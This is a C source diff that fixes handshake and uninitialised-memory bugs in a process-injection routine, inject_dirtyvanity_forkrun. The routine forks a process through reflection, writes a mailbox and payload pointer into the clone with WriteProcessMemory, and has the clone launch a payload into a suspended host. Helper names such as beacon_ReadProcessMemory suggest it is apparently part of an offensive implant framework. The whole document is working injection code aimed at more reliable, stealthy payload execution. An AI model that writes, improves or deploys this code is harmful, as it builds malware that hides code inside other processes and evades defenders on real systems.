@@ -261,6 +261,15 @@ typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void
  * remote threads, no inherited-runtime poisoning, identical image. */
 typedef struct {
 	volatile LONG go;
+	volatile LONG magic;  /* parent stamps DV_MAGIC when it fills the mailbox;
+	                       * the clone CLEARS it as its very first action after
+	                       * the go-flip. The parent only trusts `stage` once
+	                       * magic is gone - the previous code read an
+	                       * UNINITIALIZED stack DV_MAILBOX (mb.stage carried
+	                       * whatever the stack held, e.g. 679), wrote that
+	                       * garbage into the clone and then its probe loop
+	                       * (stage >= 20) reported the junk as launcher
+	                       * progress and bailed out after one poll. */
 	DWORD  host_pid;  /* suspended host pre-created by the healthy parent.
 	                   * PID, not handle: the fork's handle-table copy does
 	                   * not guarantee value stability, a PID is process-
@@ -275,7 +284,9 @@ typedef struct {
 	volatile LONG last_st;/* NTSTATUS of the failing call, if any */
 } DV_MAILBOX;
 
-static DV_MAILBOX dv_mailbox = { 0, NULL, NULL, 0, NULL, 0 };
+#define DV_MAGIC 0x44564D42 /* 'DVMB' */
+
+static DV_MAILBOX dv_mailbox = { 0, 0, 0, NULL, 0, NULL, 0, 0, 0 };
 static HANDLE dv_clone_handle = NULL;
 static DWORD  dv_clone_pid = 0;
 static DWORD  dv_host_pid = 0;
@@ -298,6 +309,10 @@ static void dv_clone_launch(DWORD host_pid, char * payload, int plen, void * par
 	DWORD  oldp = 0;
 	HANDLE host;
 	HANDLE ht;
+
+	/* consume handshake: the parent's probe only trusts `stage` once the
+	 * magic is gone (see the DV_MAILBOX comment) */
+	dv_mailbox.magic = 0;
 
 	if (host_pid == 0) {
 		dv_mailbox.stage = 2;
@@ -463,7 +478,12 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 		}
 	}
 
-	mb.go       = 1;
+	/* FILL THE WHOLE STRUCT: the old code left stage/last_st as stack
+	 * garbage and wrote them into the clone, and the probe loop then read
+	 * that junk back as "progress" (the observed stage=679). */
+	ZeroMemory(&mb, sizeof(mb));
+	mb.magic    = DV_MAGIC;
+	mb.go       = 0; /* flipped in a second write below */
 	mb.host_pid = dv_host_pid;
 	mb.payload  = (char *)remote; /* the clone launches the payload at its
 	                               * base (offset-0 convention); job-style
@@ -473,30 +493,54 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	mb.param    = rparam;
 	mb.plen_arg = plen;
 	/* dv_mailbox lives in our image - the clone's inherited copy sits at
-	 * the identical VA (fork preserves the address space) */
+	 * the identical VA (fork preserves the address space).
+	 * Two-phase write: every field lands while go is still 0, then go is
+	 * flipped on its own - the clone cannot wake up on a half-written
+	 * mailbox (go used to be the FIRST byte of a single torn write). */
 	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
 		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
 		return FALSE;
+	}
+	{
+		LONG go = 1;
+		if (!WriteProcessMemory(hc, &dv_mailbox, &go, sizeof(go), &got) || got != sizeof(go)) {
+			spawn_log("dv: mailbox go flip failed gle=", (long)GetLastError());
+			return FALSE;
+		}
 	}
 
 	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
 
 	/* read the trampoline's progress back through the clone handle (its
-	 * mailbox copy carries the stage) - the launcher is otherwise mute */
+	 * mailbox copy carries the stage) - the launcher is otherwise mute.
+	 * Only a mailbox whose magic is GONE has been consumed by the clone;
+	 * until then `stage` is the value *we* wrote (0). */
 	{
 		int i;
+		LONG last_stage = -1;
+		LONG still_magic = 0;
 		for (i = 0; i < 20; i++) {
 			DV_MAILBOX probe;
 			SIZE_T got2 = 0;
 			Sleep(150);
 			if (beacon_ReadProcessMemory(hc, &dv_mailbox, &probe, sizeof(probe), &got2) && got2 == sizeof(probe)) {
-				if (probe.stage >= 99 || probe.stage >= 20) {
+				still_magic = probe.magic;
+				if (probe.magic == DV_MAGIC) {
+					continue; /* clone has not consumed the mailbox yet */
+				}
+				last_stage = probe.stage;
+				if (probe.stage >= 20) { /* 20/21/30/31/40/41/50/51/60/99 */
 					spawn_log("dv: launcher stage=", (long)probe.stage);
 					if (probe.stage < 99)
 						spawn_log("dv: launcher last_st=", (long)probe.last_st);
 					break;
 				}
 			}
+		}
+		if (i == 20) {
+			/* loop exhausted: the clone never reported a terminal stage */
+			spawn_log("dv: probe exhausted magic=", (long)still_magic);
+			spawn_log("dv: probe exhausted stage=", (long)last_stage);
 		}
 	}
 
